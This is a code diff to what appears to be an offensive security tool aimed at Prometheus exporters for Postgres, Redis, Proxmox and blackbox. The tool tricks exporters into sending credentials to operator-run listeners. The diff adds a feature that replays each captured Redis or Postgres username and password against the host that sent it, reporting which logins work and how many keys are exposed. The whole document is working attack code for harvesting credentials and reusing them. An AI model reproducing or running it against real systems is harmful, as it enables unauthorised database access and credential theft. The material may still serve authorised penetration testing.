@@ -10,7 +10,7 @@ from typing import Any
 from urllib.parse import urlparse
 
 from .console import Console
-from .listener_runtime import start_listeners_for_trigger, stop_started_listeners
+from .listener_runtime import parse_services, start_listeners_for_trigger, stop_started_listeners
 from .logger import AttemptLogger
 from .profiles import load_profiles
 from .scanner import scan_exporters_and_trigger
@@ -30,6 +30,19 @@ _EXPORTER_TO_LISTENER_SERVICE = {
     "redis_exporter": "redis",
     "proxmox_exporter": "proxmox",
 }
+
+_TRIGGER_EXPORTER_ALIASES = {
+    "blackbox": "blackbox_exporter",
+    "blackbox_exporter": "blackbox_exporter",
+    "postgres": "postgres_exporter",
+    "postgres_exporter": "postgres_exporter",
+    "redis": "redis_exporter",
+    "redis_exporter": "redis_exporter",
+    "proxmox": "proxmox_exporter",
+    "proxmox_exporter": "proxmox_exporter",
+}
+
+_DEFAULT_LISTENER_SERVICES_RAW = "postgres,redis,proxmox,blackbox"
 
 
 def _clip_text(value: str, width: int) -> str:
@@ -70,6 +83,21 @@ def _render_trigger_callback_row(
         f"{console._paint(target_segment, 'white', sys.stdout)}"
         f" {console._paint(marker, marker_color, sys.stdout)} "
         f"{console._paint(exporter_name, 'white', sys.stdout)}"
+    )
+    console.plain(line)
+
+
+def _render_trigger_check_row(console: Console, target: str, port: str, marker: str, body: str) -> None:
+    marker_color = {"[*]": "cyan", "[+]": "green", "[-]": "yellow", "[!]": "red"}.get(marker, "white")
+    clipped_target = _clip_text(target, 64)
+    clipped_port = _clip_text(port, 16)
+    target_segment = "\t" + clipped_target + "\t" + clipped_port + "\t"
+    stage_segment = f"{'CHECK':<8}"
+    line = (
+        f"{console._paint(stage_segment, 'blue', sys.stdout)}"
+        f"{console._paint(target_segment, 'white', sys.stdout)}"
+        f" {console._paint(marker, marker_color, sys.stdout)} "
+        f"{console._paint(body, 'white', sys.stdout)}"
     )
     console.plain(line)
 
@@ -127,6 +155,180 @@ def _patch_trigger_exporters_for_with_listen(
             item["target_fmt"] = override_target_fmt
         patched.append(item)
     return patched
+
+
+def _parse_trigger_exporter_filter(raw: str | None) -> set[str]:
+    if raw is None:
+        return set()
+    selected: set[str] = set()
+    unknown: set[str] = set()
+    for part in str(raw).split(","):
+        token = part.strip().lower()
+        if not token:
+            continue
+        mapped = _TRIGGER_EXPORTER_ALIASES.get(token)
+        if mapped is None:
+            unknown.add(token)
+            continue
+        selected.add(mapped)
+    if unknown:
+        raise ValueError(
+            "unsupported trigger exporters: "
+            + ", ".join(sorted(unknown))
+            + " (supported: blackbox,postgres,proxmox,redis)"
+        )
+    return selected
+
+
+def _filter_trigger_exporters(
+    trigger_exporters: list[dict[str, Any]],
+    selected_exporter_names: set[str],
+) -> list[dict[str, Any]]:
+    if not selected_exporter_names:
+        return list(trigger_exporters)
+    filtered = [
+        item for item in trigger_exporters if str(item.get("name") or "").strip().lower() in selected_exporter_names
+    ]
+    return filtered
+
+
+def _auto_adjust_listener_services_for_trigger_exporters(
+    args: argparse.Namespace,
+    selected_exporter_names: set[str],
+    console: Console,
+) -> None:
+    if not getattr(args, "with_listen", False) or not selected_exporter_names:
+        return
+
+    required_services = {
+        service
+        for exporter_name in selected_exporter_names
+        for service in [_EXPORTER_TO_LISTENER_SERVICE.get(exporter_name)]
+        if service is not None
+    }
+    if not required_services:
+        return
+
+    try:
+        current_services = parse_services(str(getattr(args, "services", _DEFAULT_LISTENER_SERVICES_RAW)))
+    except ValueError:
+        return
+
+    if str(getattr(args, "services", "")) == _DEFAULT_LISTENER_SERVICES_RAW:
+        adjusted_services = required_services
+    else:
+        adjusted_services = current_services | required_services
+
+    args.services = ",".join(sorted(adjusted_services))
+    console.debug(f"auto listener services for trigger exporters: {args.services}")
+
+
+def _callback_event_has_complete_creds(event: dict[str, Any]) -> bool:
+    return event.get("username") not in (None, "") and event.get("password") not in (None, "")
+
+
+def _callback_event_remote_host(event: dict[str, Any]) -> str:
+    remote = str(event.get("remote_addr") or "-")
+    return remote.rsplit(":", 1)[0] if ":" in remote else remote
+
+
+def _run_trigger_credential_checks(args: argparse.Namespace, logger: AttemptLogger, console: Console) -> None:
+    from .stage_postgres import _audit_postgres_host
+    from .stage_redis import _audit_redis_host
+
+    raw_events = logger.get_trigger_callback_events()
+    check_events: list[dict[str, Any]] = []
+    for event in raw_events:
+        service = str(event.get("service") or "").strip().lower()
+        if service not in {"redis", "postgres"}:
+            continue
+        if not _callback_event_has_complete_creds(event):
+            continue
+        check_events.append(event)
+
+    if not check_events:
+        console.info("trigger credential checks: no Redis/Postgres credentials captured")
+        return
+
+    console.info(f"trigger credential checks: {len(check_events)} captured credential event(s)")
+
+    for event in sorted(
+        check_events,
+        key=lambda item: (str(item.get("service") or ""), _callback_event_remote_host(item), str(item.get("listen_port") or "")),
+    ):
+        service = str(event.get("service") or "").strip().lower()
+        host = _callback_event_remote_host(event)
+        username = str(event.get("username") or "")
+        password = str(event.get("password") or "")
+        cred_display = f"{username}:{password}"
+
+        if service == "redis":
+            port = 6379
+            _render_trigger_check_row(console, host, str(port), "[*]", f"Redis credentials {cred_display}")
+            record = _audit_redis_host(
+                host=host,
+                port=port,
+                timeout=args.timeout,
+                retries=args.retries,
+                username=username or None,
+                password=password,
+                defcreds=False,
+                show_keys=False,
+                dump_keys=False,
+                query_key=None,
+            )
+            status = str(record.get("status") or "fail")
+            err = str(record.get("error") or "").strip()
+            if status in {"valid_credentials", "open_no_auth", "weak_default_creds"}:
+                key_count = record.get("key_count")
+                keys_part = f" (keys:{key_count})" if isinstance(key_count, int) else " (keys:-)"
+                body = "Redis credentials valid" if status == "valid_credentials" else "Redis reachable (no-auth)"
+                _render_trigger_check_row(console, host, str(port), "[+]", f"{body}{keys_part}")
+            elif status == "auth_required":
+                body = f"Redis credentials invalid ({cred_display})"
+                if err:
+                    body += f" err={_clip_text(err, 80)}"
+                _render_trigger_check_row(console, host, str(port), "[-]", body)
+            else:
+                body = "Redis connection failed"
+                if err:
+                    body += f" err={_clip_text(err, 80)}"
+                _render_trigger_check_row(console, host, str(port), "[!]", body)
+            continue
+
+        port = 5432
+        _render_trigger_check_row(console, host, str(port), "[*]", f"Postgres credentials {cred_display}")
+        record = _audit_postgres_host(
+            host=host,
+            port=port,
+            timeout=args.timeout,
+            retries=args.retries,
+            username=username or None,
+            password=password,
+            defcreds=False,
+            database="postgres",
+            show_databases=False,
+            show_tables=False,
+            show_columns=False,
+            table_targets=[],
+            table_columns=[],
+            dump_table_rows=False,
+            execute_command=None,
+        )
+        status = str(record.get("status") or "fail")
+        err = str(record.get("error") or "").strip()
+        if status in {"valid_credentials", "open_no_auth", "weak_default_creds"}:
+            _render_trigger_check_row(console, host, str(port), "[+]", "Postgres credentials valid")
+        elif status == "auth_required":
+            body = f"Postgres credentials invalid ({cred_display})"
+            if err:
+                body += f" err={_clip_text(err, 80)}"
+            _render_trigger_check_row(console, host, str(port), "[-]", body)
+        else:
+            body = "Postgres connection failed"
+            if err:
+                body += f" err={_clip_text(err, 80)}"
+            _render_trigger_check_row(console, host, str(port), "[!]", body)
 
 
 def _run_trigger_requests(
@@ -266,6 +468,9 @@ def run_trigger_stage(args: argparse.Namespace, logger: AttemptLogger) -> int:
     if args.retries < 0:
         console.error("--retries must be >= 0")
         return 2
+    if getattr(args, "check_credentials", False) and not getattr(args, "with_listen", False):
+        console.error("--check-credentials requires --with-listen")
+        return 2
 
     targets = getattr(args, "targets", None) or getattr(args, "hosts", None)
     hosts_file = getattr(args, "hosts_file", None)
@@ -282,6 +487,12 @@ def run_trigger_stage(args: argparse.Namespace, logger: AttemptLogger) -> int:
         profiles = load_profiles(args.profiles_file)
     except (OSError, ValueError) as exc:
         console.error(f"failed to load profiles: {exc}")
+        return 2
+
+    try:
+        selected_trigger_exporters = _parse_trigger_exporter_filter(getattr(args, "trigger_exporters_filter", None))
+    except ValueError as exc:
+        console.error(str(exc))
         return 2
 
     if not hosts:
@@ -317,7 +528,16 @@ def run_trigger_stage(args: argparse.Namespace, logger: AttemptLogger) -> int:
             return 2
         console.info(f"trigger output file: {output_path}")
 
-    trigger_exporters = profiles["trigger_exporters"]
+    trigger_exporters = _filter_trigger_exporters(profiles["trigger_exporters"], selected_trigger_exporters)
+    if selected_trigger_exporters and not trigger_exporters:
+        console.error("no trigger exporters matched filter")
+        return 2
+    if selected_trigger_exporters:
+        _auto_adjust_listener_services_for_trigger_exporters(args, selected_trigger_exporters, console)
+        console.debug(
+            "trigger exporters filter="
+            + ",".join(sorted(str(item.get("name") or "") for item in trigger_exporters))
+        )
     if args.with_listen:
         trigger_exporters = _patch_trigger_exporters_for_with_listen(trigger_exporters, args)
         proxmox_tls_enabled = bool(getattr(args, "proxmox_tls", False))
@@ -367,6 +587,8 @@ def run_trigger_stage(args: argparse.Namespace, logger: AttemptLogger) -> int:
             show_trigger_info=True,
             log_trigger_attempts=False,
         )
+        if getattr(args, "check_credentials", False):
+            _run_trigger_credential_checks(args, logger, console)
         console.info("listeners are up; waiting for incoming events (Ctrl+C to stop)")
         while True:
             time.sleep(1)
